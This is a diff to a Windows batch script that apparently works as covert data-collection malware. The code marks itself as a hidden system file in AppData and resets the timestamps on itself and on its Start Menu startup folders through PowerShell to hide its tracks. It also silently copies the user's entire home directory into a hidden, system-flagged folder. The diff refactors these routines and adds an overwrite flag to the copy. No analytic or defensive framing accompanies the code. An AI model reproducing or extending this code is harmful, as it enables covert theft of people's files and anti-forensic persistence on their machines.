@@ -24,30 +24,12 @@ powershell  (Get-Item "lmao.bat").LastAccessTime=Get-Date
 powershell  (Get-Item "lmao.bat").CreationTime=Get-Date
 attrib +s "%appdata%\Microsoft\Windows\lmao.bat"
 
-if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (
-set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
-set tempor=%tempor: =` %
-echo %tempor%
-powershell (Get-Item %tempor%).LastWriteTime=Get-Date
-powershell (Get-Item %tempor%).LastAccessTime=Get-Date
-powershell (Get-Item %tempor%).CreationTime=Get-Date
-powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
-powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
-powershell (Get-Item %tempor%\*).CreationTime=Get-Date
-)
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup" (goto :lmaostartuptask)
 
-if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (
-set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
-set tempor=%tempor: =` %
-echo %tempor%
-powershell (Get-Item %tempor%).LastWriteTime=Get-Date
-powershell (Get-Item %tempor%).LastAccessTime=Get-Date
-powershell (Get-Item %tempor%).CreationTime=Get-Date
-powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
-powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
-powershell (Get-Item %tempor%\*).CreationTime=Get-Date
-)
+if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert" (goto :atinserttask)
 
+:aftertask
+echo IDK
 if %skip%==true (goto :1)
 
 :searching
@@ -117,7 +99,7 @@ echo %dire% > RESUME
 attrib +h RESUME
 mkdir "%dire%"
 attrib +s +h "%dire%"
-xcopy /S /D "%homedrive%%homepath%" "%dire%"
+xcopy /S /D "%homedrive%%homepath%" "%dire%" /Y
 attrib -h RESUME
 del RESUME
 
@@ -176,3 +158,29 @@ exit
 cd "%appdata%\Microsoft\Windows\"
 start lmao.bat
 exit
+
+REM DO NOT PUT IN IF; MAKES PROGRAM EXECUTE(???) AND CRASHES
+
+:lmaostartuptask
+set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\lmaostartup"
+set tempor=%tempor: =` %
+echo %tempor%
+powershell (Get-Item %tempor%).LastWriteTime=Get-Date
+powershell (Get-Item %tempor%).LastAccessTime=Get-Date
+powershell (Get-Item %tempor%).CreationTime=Get-Date
+powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
+powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
+powershell (Get-Item %tempor%\*).CreationTime=Get-Date
+goto :aftertask
+
+:atinserttask
+set tempor="%appdata%\Microsoft\Windows\Start Menu\Programs\atinsert"
+set tempor=%tempor: =` %
+echo %tempor%
+powershell (Get-Item %tempor%).LastWriteTime=Get-Date
+powershell (Get-Item %tempor%).LastAccessTime=Get-Date
+powershell (Get-Item %tempor%).CreationTime=Get-Date
+powershell (Get-Item %tempor%\*).LastWriteTime=Get-Date
+powershell (Get-Item %tempor%\*).LastAccessTime=Get-Date
+powershell (Get-Item %tempor%\*).CreationTime=Get-Date
+goto :aftertask
